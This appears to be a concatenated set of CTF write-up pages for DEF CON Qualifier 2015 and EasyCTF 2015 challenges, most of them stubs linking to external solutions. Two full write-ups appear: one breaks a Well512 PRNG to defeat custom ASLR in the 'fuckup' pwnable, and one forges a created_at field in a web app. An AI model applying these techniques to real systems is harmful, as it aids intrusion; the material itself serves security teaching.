# DEF CON Qualifier 2015: r0pbaby

**Category:** Baby's First
**Points:** 1
**Solves:** TODO
**Description:**

> r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me:10436 [Download](http://downloads.notmalware.ru/r0pbaby_542ee6516410709a1421141501f03760)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/babysfirst/r0pbaby>
* <http://box.haxx.in/~blasty/e9b52923e5b8dfefdc917bb88a92843ac4dbe4a7/r0pbaby_xpl.py>
* <http://blog.0x80.org/r0pbaby-writeup-defcon-prequal/>
* <http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/>
* [Japanese](http://qiita.com/MarshMallow_sh/items/87019f038e4f5dc82451)
* <http://pastebin.com/3jr47B98>
# DEF CON Qualifier 2015: catwestern

**Category:** Coding Challenge
**Points:** 1
**Solves:** TODO
**Description:**

> meow
>
> catwestern_631d7907670909fc4df2defc13f2057c.quals.shallweplayaga.me 9999


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/coding/catwestern>
* <http://fritzfs.blogspot.de/2015/05/writeup-coding-defcon-ctf-quals-2015.html>
* <http://capturetheswag.blogspot.com.au/2015/05/defcon-ctf-2015-cat-western-1-point.html>
* <https://github.com/rick2600/writeups/blob/master/defcon2015/catwestern.md>
* <http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-catwestern-writeup/>
* [Korean](http://blackcon.tistory.com/122)
* <https://gist.github.com/emyei/828f8fa231b82bc2925e>
* <http://pastebin.com/BU1dh8xN>
* <http://pastebin.com/fMQ7v6Ut>
# DEF CON Qualifier 2015: blackbox

**Category:** Miscellaneous
**Points:** 2
**Solves:** TODO
**Description:**

> Open the box at blackbox_ced7f267475a0299446fa86c26d77161.quals.shallweplayaga.me:18324


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.whitehatters.academy/legitbs-2015-blackbox/>
* <https://gist.github.com/anonymous/60eda1db5c7d8b852840>
# DEF CON Qualifier 2015: patcher

**Category:** Miscellaneous
**Points:** 3
**Solves:** TODO
**Description:**

> Patch the binary from cybergrandsandbox, and submit it here
>
> [Patch This](http://downloads.notmalware.ru/cybergrandsandbox_e722a7ec2ad46b9fb8472db37cb95713)


## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/sCQT72KR>
# DEF CON Qualifier 2015: cybergrandsandbox

**Category:** Pwnable
**Points:** 2
**Solves:** TODO
**Description:**

> [You'll need these](http://repo.cybergrandchallenge.com/boxes/)
>
> <https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/running-the-vm.md>
>
> [Pwn This](http://downloads.notmalware.ru/cybergrandsandbox_e722a7ec2ad46b9fb8472db37cb95713)
>
> [This launches it](http://downloads.notmalware.ru/cybergrandsandbox_launcher_cf878d2811220c8793ae9b132d7fd490)
>
> cybergrandsandbox_e722a7ec2ad46b9fb8472db37cb95713.quals.shallweplayaga.me:4347


## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.0x80.org/cybergrandsandbox-writeup-defcon-prequal/>
* <https://gist.github.com/jgor/15029aa1efa960e5c805#file-defconctf2015_cybergrandsandbox-py>
# DEF CON Qualifier 2015: fuckup

**Category:** Pwnable
**Points:** 3
**Solves:** TODO
**Description:**

> fuckup_56f604b0ea918206dcb332339a819344.quals.shallweplayaga.me:2000
>
> OR fuckup_56f604b0ea918206dcb332339a819344.quals.shallweplayaga.me:46387
>
> [Download](http://downloads.notmalware.ru/fuckup_56f604b0ea918206dcb332339a819344)


## Write-up

by [epochfail](https://github.com/epochfailctf) and [wm4?](https://github.com/wm4)

TLDR: break underlying PRNG without using z3.

### Summary

You get a binary with a bootleg implementation of in-process text-ASLR. The binary is PIC-compiled, and there's a function to re-randomize the text location. The re-randomization is done with page granularity and it changes text and stack locations.

Initial menu:

```
Welcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.
This app is to help prove the benefits of F.U.C.K.U.P.
Main Menu
---------
1. Display info
2. Change random
3. View state info
4. Test stack smash
-------
0. Quit
```

Upon choosing `2`, you get `App moved to new random location` -- text and stack have been shifted and stack values rewritten to point to the new memory location. So from time to time, you get a segfault. Fun. Also probably not exploitable.

Option `3` will give us the last random number (which determiens the current textbase) and re-randomize the text. This is useful for e.g. PRNG prediction.

Option `4` is more interesting:
```
Input buffer is 10 bytes in size. Accepting 100 bytes of data.
This will crash however the location of the stack and binary are unknown to stop code execution
```

This leaves multiple avenues of attack:
* Predict PRNG used to shift text around
* Partial overwrite of data on the stack, hoping to hit something juicy
* Work with VDSO

All of these have been done by multiple teams in the CTF, most clean one being the partial overwrite of the return address (set its LSB to `\x14` to re-initialize the PRNG with known values at `0x08048114`).

I will describe a "proper" solution to this that does not use z3 and breaks the underlying PRNG.

### Solution


Analysing the PRNG, we see it is a Well512 generator (obtained by googling the only magic number in the decompiled code) with some floating-point adjustments. These do not change the mechanics of the PRNG, only that the results are off by 1, and we have to adjust for that. We do not need to know what PRNG it is, though, since HexRays decompiles the code to something like this:

```python
def prng_gen_next():
    state = self.state
    idx = self.idx

    v5 = state[(idx + 15) & 0xF];
    v5 &= 0xffffffff;
    v6 = state[(idx + 13) & 0xF] ^ state[idx] ^ (state[idx] << 16) ^ (state[(idx + 13) & 0xF] << 15);
    v6 &= 0xffffffff;
    v7 = state[(idx + 9) & 0xF] ^ (state[(idx + 9) & 0xF] >> 11);
    v7 &= 0xffffffff;
    v8 = ((v7 ^ v6) << 5) & 0xDA442D24 ^ v7 ^ v5 ^ (v5 << 2) ^ (v6 << 18) ^ (v7 << 28);
    v8 &= 0xffffffff;

    state[(idx + 10) & 0xF] = v7 ^ v6;
    state[(idx + 15) & 0xF] = v8;

    self.idx = (idx + 15) & 0xF;  # Subtract 1 modulo 16
    return v8
```

Three key observations:
* We see part of the state (`v8`) as returned by choosing `3` in the main menu.
* The state function uses only xor, bitwise-and, shifts to do its computation on state values.
* State values are either untouched, read from, or written to.

If you consider this function as an algebraic function that modifies state, that is, a function `f: State -> State` where `State` is a 512-bit vector (a vector in `GF(2)^512`)... then you can note that it is a [linear map](http://en.wikipedia.org/wiki/Linear_map). Linear maps have the property that, for two inputs `a` and `b`, it is true that `f(a+b) = f(a) + f(b)`. And, linear maps can be represented by matrices (and vice versa).

So, if we can build a matrix `M` for one application of `prng_gen_next`, then maybe we can invert it and directly solve for the initial seed of the PRNG from its outputs. Unfortunately, this is impossible: `state[(idx + 10) % 0xf]` is lost after the first call, and so the function is not invertible. But it does not mean we can't use the same method: we do not need to know what that value was (it is overwritten and its initial seed value is never used).

Another problem is that the matrix `M` does not work for two applications of `prng_gen_next` since we have another variable, `idx`, which changes with every call. But we can work around that by defining `M_0, M_1, ..., M_15` where each `M_i` is the result of calling `prng_gen_next` with `idx=i`.

Construction of these matrices is trivial: by the additive property, it is enough to call `f(1), f(2), f(4), f(8), ..., f(2**511)` to obtain each column of the matrix, in order. See Wikipedia or Google or an algebra coursebook for why that is so.

So, now that we have 16 matrices, we can solve for the initial state. Note that these matrices do not depend on the generated random values from the server, and so this can be precomputed and cached.

From here, there are 2 ways to solve this algebraically:
* Use an 8192x8192 bit matrix that is a block matrix made up of `M_i` (and your state is 512 bits embedded into a 8192-dim space via a monomorphism, with 8192-512 zeros)
* Use a 512x512 bit matrix and duct tape.

We go for the smaller (more elegant) solution here.

Suppose we had a vector `v` of 16 consecutive integer PRNG outputs. We know we can get it by repeatedly choosing `3`. Let's expand it into a 512-bit vector (512=32*16) by writing each integer as a bitstring. Then, we want to find a matrix `A` that gives `A.s = v` for all possible initial states `s`. In other words, we need a matrix that takes in an initial state `s` and produces a vector that is the outputs of PRNG. We already have `M_i` that almost do this, so we just need to combine them to produce `A`.

Note, that if stars align, we would be able to solve for `s` given `A` and `v`. The exact condition is that the rank of `A` must be at least 480 (512-32) as we lose one of the initial state values. This happens to (almost) always be the case.

Let's think about how matrix-vector multiplication works. If we only care about the ith value in the vector, then it comes from the ith row in the matrix. The rest of the rows do not affect that particular value. So we can try gluing some rows together from `M_i` matrices to form A.

Remember that each `M_i` is defined as if it started off at `idx=i`. So, for example, to go from `idx=0` to `idx=13` in one matrix, we need to multiply them together, producing `M_14 . M_15 . M_0 . s`. Note that it goes backwards from 0 to 15 to 14 to 13, etc. since `idx` is decremented every time.

Further, note how the PRNG returns a value that is part of the state. As such, calling PRNG 3 times will yield the 13th value in the vector `M_14 . M_15 . M_0 . s`, which is the bits `[13*32 .. 14*32)` in the new state vector. Hence, we know that these are determined by rows `[13*32 .. 15*32)` of our hypothetical matrix `A`.

But wait! Didn't we just determine that they are computed from a product of `M_i` matrices? Yes. Therefore, rows of matrix `A` come from rows of `M_i` products. In particular, every 32 rows come from different products. First 32 rows of `A` are last 32 rows of `M_0`, next 32 rows of `A` are second-last 32 rows of `M_15 . M_0`, etc. These are off-by-one because of `idx` returning its `idx-1`th value.

After the matrix `A` is built, we note it has rank 480, which is what we expected: we lose `state[(idx + 10) % 0xf]`.

Solution is obtained by taking 16 consecutive PRNG outputs, serializing them into 512 bits as a bitstring, and solving `A.x = v` for `x`. That gives us the initial state of the PRNG (with 1 value erased), so we seed with that state and skip 16 random values. The next random value will be in-sync with the server. You will need to subtract 1 from the PRNG obtained locally, and add 1 to all remote PRNGs leaked, since the binary uses floats which end up rounding down between conversions. Trololol.

As usual, the attached exploit has all the necessary details (it works!).

Now we have the text base, and the ROP chain is left as an exercise to the reader.


## Other write-ups and resources

* <http://lokalhost.pl/ctf/defcon2015/fuck.py>
* <http://hastebin.com/iyinepaxen.py>
# DEF CON Qualifier 2015: hackercalc

**Category:** Pwnable
**Points:** 5
**Solves:** TODO
**Description:**

> hackercalc_2e9c870a8449603f8d4b748d78993026.quals.shallweplayaga.me:21222 [Download](http://downloads.notmalware.ru/hackercalc_2e9c870a8449603f8d4b748d78993026)


## Write-up

(TODO)

## Other write-ups and resources

* <http://vulph.com/2015/09/27/defcon-hackercalc-writeup.html>
* [Exploit](http://pastebin.com/2ynEtVwh)
* <http://secgroup.dais.unive.it/2015/05/19/defcon-ctf-2015-hackercalc-exploit>
* <http://pastebin.com/QRTwZNqS>
# DEF CON Qualifier 2015: heapsoffun

**Category:** Pwnable
**Points:** 4
**Solves:** TODO
**Description:**

> If you have been knockedup then you know what to do. Perhaps try "tirer"
>
> sha1sum heapsoffun 5ee5b2cde811e617cd789c73c1d8d2d9e8b27c36
>
> Yes we know the flag is owned by root.


## Write-up

(TODO)

## Other write-ups and resources

* [sophia.re](http://sophia.re/defconquals2015_heapsoffun_writeup.html) (Down, go to root page - some JS loading stuff)
* [French](http://blog.scrt.ch/2015/05/24/defcon-2015-resolution-heapsoffun/)
* <http://lokalhost.pl/ctf/defcon2015/heap.py>
* <http://pastebin.com/N8JNkiUL>
# DEF CON Qualifier 2015: int3rupted

**Category:** Pwnable
**Points:** 5
**Solves:** TODO
**Description:**

> Connect to int3rupted_3bb8f10793b82841c44a366eb9f27223.quals.shallweplayaga.me, port 0xcccc


## Write-up

(TODO)

## Other write-ups and resources

* <http://radare.today/solving-int3rupted-from-defcon-2015-qualifier-with-r2/>
* <http://lokalhost.pl/ctf/defcon2015/int3.py>
* <https://gist.github.com/zachriggle/72a36becca0650a766ba>
* <https://github.com/scwuaptx/CTF/blob/master/2015-writeup/defcon/interupt.py>
# DEF CON Qualifier 2015: secrf

**Category:** Pwnable
**Points:** 6
**Solves:** TODO
**Description:**

> secrf_cdd8445b254189eb39861162d086eb16.quals.shallweplayaga.me:27398 [Download](http://downloads.notmalware.ru/secrf_cdd8445b254189eb39861162d086eb16)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# DEF CON Qualifier 2015: tensixtyseven

**Category:** Pwnable
**Points:** 4
**Solves:** TODO
**Description:**

> tensixtyseven_ed879d24fd6365cf38b6c96b5e077d75.quals.shallweplayaga.me:1161
>
> [Download](http://downloads.notmalware.ru/tensixtyseven_ed879d24fd6365cf38b6c96b5e077d75)


## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/nU26i7aj>
* <http://skidpaste.org/UasGApIf.txt> (down)
# DEF CON Qualifier 2015: thing2

**Category:** Pwnable
**Points:** 4
**Solves:** TODO
**Description:**

> We have a special guest challenge from thing2.
>
> AppJailLauncher.exe /key:key /port:8200 DconQuals.exe
>
> thing2_e89e83e6cc343256f99fbfe6f434d788.quals.shallweplayaga.me
>
> [Download](http://downloads.notmalware.ru/thing2_e89e83e6cc343256f99fbfe6f434d788)


## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/j5z6uzM8>
* <http://pastebin.com/wpxQ7VDg>
# DEF CON Qualifier 2015: twentyfiveseventy

**Category:** Pwnable
**Points:** 3
**Solves:** TODO
**Description:**

> twentyfiveseventy_2809b4d140123e359485305658a2ab40.quals.shallweplayaga.me:1161
>
> [Download](http://downloads.notmalware.ru/twentyfiveseventy_2809b4d140123e359485305658a2ab40)


## Write-up

(TODO)

## Other write-ups and resources

<http://www.securifera.com/blog/2015/05/27/defcon-quals-2015-twentyfiveseventy/>
# DEF CON Qualifier 2015: wibbly wobbly timey wimey

**Category:** Pwnable
**Points:** 2
**Solves:** TODO
**Description:**

> Wibbly Wobbly Timey Wimey
>
> Don't blink!
>
> wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606 [Download](http://downloads.notmalware.ru/wwtw_c3722e23150e1d5abbc1c248d99d718d)


## Write-up

(TODO)

## Other write-ups and resources

* [sophia.re](http://sophia.re/defconquals2015_wibbly_writeup.html) (go to main site, then look for the writeup)
* <http://blog.morganz.me/blog/2015/05/23/def-con-ctf-qualifier-2015-wibbly-wobbly-timey-wimey-writeup/>
* <http://bruce30262.logdown.com/posts/277028-defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey>
* <https://babyphd.net/2015/05/write-up-defcon-ctf-2015-wwtv-cybergrandsandbox/>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/19/114004)
* <http://mangoplzz.tumblr.com/post/119736590617/defcon-23-wibbly-wobbly-timey-wimey-writeup>
* <http://pastebin.com/x2z1KgqW>
# DEF CON Qualifier CTF write-ups

* <https://2015.legitbs.net/>
* [Scoreboard](https://legitbs.net/statdump_2015/scoreboard.html) or [local alternative](scoreboard)

## Completed write-ups

* [babys-first/babyecho](babys-first/babyecho)
* [pwnable/fuckup](pwnable/fuckup)
* [web/waiting-for-your-touch](web/waiting-for-your-touch)

## External write-ups only

* [babys-first/babycmd](babys-first/babycmd)
* [babys-first/mathwhiz](babys-first/mathwhiz)
* [babys-first/r0pbaby](babys-first/r0pbaby)
* [coding-challenge/catwestern](coding-challenge/catwestern)
* [misc/blackbox](misc/blackbox)
* [misc/patcher](misc/patcher)
* [pwnable/cybergrandsandbox](pwnable/cybergrandsandbox)
* [pwnable/hackercalc](pwnable/hackercalc)
* [pwnable/heapsoffun](pwnable/heapsoffun)
* [pwnable/int3rupted](pwnable/int3rupted)
* [pwnable/tensixtyseven](pwnable/tensixtyseven)
* [pwnable/thing2](pwnable/thing2)
* [pwnable/twentyfiveseventy](pwnable/twentyfiveseventy)
* [pwnable/wibbly-wobbly-timey-wimey](pwnable/wibbly-wobbly-timey-wimey)
* [reverse/access-control](reverse/access-control)
* [reverse/klug](reverse/klug)
* [reverse/knockedupd](reverse/knockedupd)
* [reverse/pr0dk3y](reverse/pr0dk3y)
* [reverse/shitcpu](reverse/shitcpu)

## Missing write-ups

* [pwnable/secrf](pwnable/secrf)
* [reverse/scrambler](reverse/scrambler)
# DEF CON Qualifier 2015: access control

**Category:** Reverse Engineering
**Points:** 1
**Solves:** TODO
**Description:**

> It's all about who you know and what you want. access_control_server_f380fcad6e9b2cdb3c73c651824222dc.quals.shallweplayaga.me:17069
>
> [Download Client](http://downloads.notmalware.ru/client_197010ce28dffd35bf00ffc56e3aeb9f)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/reversing/accesscontrol>
* <http://www.mrt-prodz.com/blog/view/2015/05/def-con-2015-quals---access-control-1pt-writeup>
* <https://github.com/TeamColonelPanic/write-ups/tree/master/2015/defcon-qualifier-ctf-2015/reverse/access-control>
* <http://geeksspeak.github.io/blog/2015/05/19/defconctf-2015-quals-access-control-writeup/>
# DEF CON Qualifier 2015: klug

**Category:** Reverse Engineering
**Points:** 3
**Solves:** TODO
**Description:**

> klug_64eee7bb1da26c44fcb7a15d85a017c9.quals.shallweplayaga.me:52242 [Download](http://downloads.notmalware.ru/klug_64eee7bb1da26c44fcb7a15d85a017c9)


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/Riatre/5e91727d83081831877e>
* <http://tasteless.eu/2015/06/defcon-quals-2015-klug/>
# DEF CON Qualifier 2015: knockedupd

**Category:** Reverse Engineering
**Points:** 1
**Solves:** TODO
**Description:**

> You went and got it knockedup.
>
> [Download](http://downloads.notmalware.ru/knockedupd_71a592a753bf9dcd7d7ad5fa69b2bab3)
>
> knockedupd_71a592a753bf9dcd7d7ad5fa69b2bab3.quals.shallweplayaga.me


## Write-up

(TODO)

## Other write-ups and resources

* [sophia.re](http://www.sophia.re/defconquals2015_knockedupd_writeup.html)
# DEF CON Qualifier 2015: pr0dk3y

**Category:** Reverse Engineering
**Points:** 2
**Solves:** TODO
**Description:**

> Crack me at pr0dk3y_40687b492c80205cccb34db1eabf6456.quals.shallweplayaga.me:7938 [Download](http://downloads.notmalware.ru/pr0dk3y_40687b492c80205cccb34db1eabf6456)


## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/E4gXkax3>
# DEF CON Qualifier 2015: Scrambler

**Category:** Reverse Engineering
**Points:** 3
**Solves:** TODO
**Description:**

> Enhance!
>
> hint: The time of image generation matches the start of the game which can also be viewed on the quals registration page.
>
> [Download](http://downloads.notmalware.ru/scrambler_3ff9e5b9795ac8fc4117da6660ced01b.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# DEF CON Qualifier 2015: shitcpu

**Category:** Reverse Engineering
**Points:** 3
**Solves:** TODO
**Description:**

> shitcpu_5f766bf9fb92aead0ae2de76ea57f21c.quals.shallweplayaga.me:19192 [Download](http://downloads.notmalware.ru/shitcpu_5f766bf9fb92aead0ae2de76ea57f21b)


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/mheistermann/273cf850f207b886f9de>
* <https://gist.github.com/libmaru/d46bd65bf6a7a1a94f5a>
# DEF CON Qualifier 2015: Waiting for your Touch

**Category:** Web
**Points:** 2
**Solves:** TODO
**Description:**

> <http://waiting-for-your-touch.quals.shallweplayaga.me>
>
> HTTP Basic:
>
> username: come-on-and-slam
>
> password: welcome-to-japan


## Write-up

by [gbarboza](https://github.com/gbarboza)

*From Plaid Parliament of Pwning*

This problem was a simple bootstrap-themed web app. The landing page had a form to create an account. Upon creating an account and logging in we were shown a page that had a countdown timer and a button [much like reddit's The Button subreddit](http://www.reddit.com/r/thebutton). Additionally there was a page that showed the names of users that had managed to click the button and a page that allowed for changing our user's displayed name.

It is clear our goal is to click the button and satisfy our Pavlovian response to buttons on the Internet. However, the `<input>` tag for the button had the `disabled` attribute set, rendering it unclickable. If the `disabled` attribute was removed, the button was then obviously clickable, but clicking it resulted in an error being displayed that said something along the lines of 

`your account's created_at field is too recent` 

At this point, it became clear what the solution was. We simply had to modify the request that changed our user's displayed name to also include the `created_at` field. Setting our `created_at` value to a very early Unix timestamp value like 999 succeeded and upon reloading the Button page we could click the button which gave us the flag... which I did not write down.


## Other write-ups and resources

* none yet
# EasyCTF 2015: ADoughBee (500)

**Category:** Binary-Exploitation
**Points:** 500
**Solves:** 
**Description:**

> ADoughBee Incorporated has released their [FlagEncrypt](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/adoughbee.rar) software. But it seems that unless you unlock the software, you can't really do anything! I know that `evil@anomat.cf` has a working license, try to find their serial number!
> 
> 
> The serial is 25 characters long, alphanumeric. When you submit the flag, don't include `easyctf{}`.
> 
> 
> Hint: How does the program check your serial?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/adoughbee_500.md>
* <https://gist.github.com/ext0/baddfdec440acb164f03>
# EasyCTF 2015: Buffering (80)

**Category:** Binary-Exploitation
**Points:** 80
**Solves:** 
**Description:**

> Can you overflow the stack? Try it at `/problems/overflow1` on the EasyCTF shell server. The source is available at `/problems/overflow1/overflow1.c`, and the program you're trying to overflow is at `/problems/overflow1/overflow1`. Good luck!
> 
> 
> Hint: Read a little bit about the stack [here](https://www.exploit-db.com/docs/28475.pdf).


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/buffering_80.md>
* <https://github.com/DavidJacobson/EasyCTF-2015-writeup/blob/master/binary_exploitation.md#buffering---80-pts>
* <https://github.com/1lastBr3ath/EasyCTF-2015-Writeup/blob/master/binary_exploitation.md#buffering---80-pts>
* <https://github.com/in-s-ane/easyctf-2015/blob/master/Buffering_80/solution.txt>
# EasyCTF 2015: Much Studying (400)

**Category:** Binary-Exploitation
**Points:** 400
**Solves:** 
**Description:**

> I suck at AP Lit (what is engwrish). I was able to steal the grader for the AP Lit test from the CollageBored, but it's not helping me do any better. Can you help me?
> 
> 
> Source can be found [here](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/aplit.c), and the binary with the actual flag is on the shell server at `/problems/aplit`.
> 
> 
> Hint: Oh poop! Forgot to give you my prompt. Here it is: Choose a novel that you hate, and then write an essay about it.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/much_studying_400.md>
* <https://github.com/DavidJacobson/EasyCTF-2015-writeup/blob/master/binary_exploitation.md#much-studying----400-pts>
* <https://github.com/1lastBr3ath/EasyCTF-2015-Writeup/blob/master/binary_exploitation.md#much-studying---400-points->
# EasyCTF 2015: All Zob's Fault (350)

**Category:** Cryptography
**Points:** 350
**Solves:** 
**Description:**

> Apparently our crypto program didn't store the correct phi-value or something for this [message](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/all_zobs_fault.txt); it spits out gibberish when we try to decrypt it. Either the memory had a rare fault or Zob's being an idiot again. Please help.
> 
> 
> Hint: Zob works at the Russian Space Agency.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/all_zobs_fault_350.md>
# EasyCTF 2015: Bigger is Better (500)

**Category:** Cryptography
**Points:** 500
**Solves:** 
**Description:**

> The larger the primes, the stronger the RSA cryptosystem is, right?
> 
> 
> [Data](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/biggerisbetter.txt).


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/bigger_is_better_500.md>
# EasyCTF 2015: Black Table (450)

**Category:** Cryptography
**Points:** 450
**Solves:** 
**Description:**

> Good morning, and welcome to the [Black Table Transit System](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/blacktable.txt). NO PLEASE SAVE US NOT KILL US
> 
> 
> Hint: Black Table really likes copying its competitor, but to appease the buzzword-loving venture capitalists, they made it seem like there was automation involved.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/black_table_450.md>
# EasyCTF 2015: Cave Johnson (450)

**Category:** Cryptography
**Points:** 450
**Solves:** 
**Description:**

> Welcome to [Small Hole Sciences](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/cave-johnson.txt).
> 
> 
> (Since all of their budget was spent on moon rocks, they were only able to afford an old-fashioned Vigenere Cipher.)
> 
> 
> Hint: [Information](https://en.wikipedia.org/wiki/Vigenere_cipher) from a reputable source


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/cave_johnson_450.md>
# EasyCTF 2015: H4sh3D (200)

**Category:** Cryptography
**Points:** 200
**Solves:** 
**Description:**

> We discovered that Varsos's server uses a fairly insecure hash function to check passwords. The hashed password is `c9b5af9864efa933`, and the hashing function can be found [here](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/hash1.py).
> 
> 
> Hint: Seems like working backwards will be a pain. Is there any easier way?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/h4sh3d_200.md>
# EasyCTF 2015: Hardwood Floors (200)

**Category:** Cryptography
**Points:** 200
**Solves:** 
**Description:**

> Our intelligence tells us that [this](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/hardwood.py) function was used to encrypt a message. They also managed to capture a spy while in the field. Unfortunately, our interrogators only managed to find the [ciphertext](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/floors.txt) of a message on his phone. Can you help us recover the secret message?
> 
> 
> Hint: The correct flag is the one you think is correct


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/hardwood_floors_200.md>
# EasyCTF 2015: I <3 SLEEPING (125)

**Category:** Cryptography
**Points:** 125
**Solves:** 
**Description:**

> We received this string, but I have no idea what it means! `3845281945283805284526053525260547380516453748164748478317454508`
> 
> 
> Hint: ARGH I CAN'T SLEEP PEOPLE KEEP STEALING MY ZZZZs . . . NO MORE ZZZs /cries
> 
> Hint: P.S. You're overthinking it.
> 
> Hint: P.P.S. Blocks of 2
> 
> Final hint: sqrt(ABCDEFGHIJKLMNOPQRSTUVWXY). Where'd my Z's go?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/i_3_sleeping_125.md>
# EasyCTF 2015: Julius Save Me (20)

**Category:** Cryptography
**Points:** 20
**Solves:** 
**Description:**

> This cipher involves shifty letters! `Cnebnl Vtxltk bl max uxlm unm fr ykbxgw ebdxl Gtihexhg uxmmxk yhk patmxoxk kxtlhg. Ha pxee. Max yetz bl xtlrvmy{Gti0exhg_ol_Vt3l4k}`
> 
> 
> Hint: You might want to read up on [Caesar ciphers](https://en.wikipedia.org/wiki/Caesar_cipher).


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/julius_save_me_20.md>
# EasyCTF 2015: Known Plaintext 1 (300)

**Category:** Cryptography
**Points:** 300
**Solves:** 
**Description:**

> Solve the problem using the programming interface. The input file is `knownplaintext1.in`.
> 
> 
> The input is formatted `[d/e] <string>`. The first character specifies whether the assignment is to encrypt or to decrypt, and the string is either the plaintext or the ciphertext, depending on the first letter.
> 
> 
> Hint: Figure it out yourself ;)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/known_plaintext_1_300.md>
# EasyCTF 2015: Known Plaintext 2 (500)

**Category:** Cryptography
**Points:** 500
**Solves:** 
**Description:**

> Solve the problem using the programming interface. The input file is `knownplaintext2.in`.
> 
> 
> The input is formatted `[d/e] <string>`. The first character specifies whether the assignment is to encrypt or to decrypt, and the string is either the plaintext or the ciphertext, depending on the first letter.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/known_plaintext_2_500.md>
# EasyCTF 2015: Known Plaintext 3 (300)

**Category:** Cryptography
**Points:** 300
**Solves:** 
**Description:**

> Solve the problem using the programming interface. The input file is `knownplaintext3.in`.
> 
> 
> The input is formatted `[d/e] <string>`. The first character specifies whether the assignment is to encrypt or to decrypt, and the string is either the plaintext or the ciphertext, depending on the first letter.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/known_plaintext_3_300.md>
# EasyCTF 2015: Matrices (575)

**Category:** Cryptography
**Points:** 575
**Solves:** 
**Description:**

> Looks like Zob tried to make his own encryption algorithm again; [here's](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/matrix.java) the program. [Here](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/message1), [here](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/output1), and [here](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/output2) are two messages encrypted with the same key and the plaintext of one of the messages. Convince Zob to stop trying to make his own ciphers!
> 
> 
> Hint: Technically, all the math you need for this problem you learned in Algebra 2.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/matrices_575.md>
# EasyCTF 2015: Misaka Mikoto (50)

**Category:** Cryptography
**Points:** 50
**Solves:** 
**Description:**

> My friends like anime way too much . . . they decided that to give me an encoded [message](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/message.txt), but I can't solve it because I'm not a weeb!
> 
> 
> Hint: railguns are cool


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/misaka_mikoto_50.md>
* <https://johnwig.gitbooks.io/misaka-mikoto/content/>
# EasyCTF 2015: Respiratory Sinus Arrhythmia (550)

**Category:** Cryptography
**Points:** 550
**Solves:** 
**Description:**

> Zob is stupid and modified his RSA program [here](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/rsa3.java). He left after we fired him after the mess we had with his bad matrix cipher, but he kept the server password encrypted with this program (we put it in the program for you). Can you help us recover the password?
> 
> 
> Hint: Fractions :D


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/respiratory_sinus_arrhythmia_550.md>
# EasyCTF 2015: XOR (150)
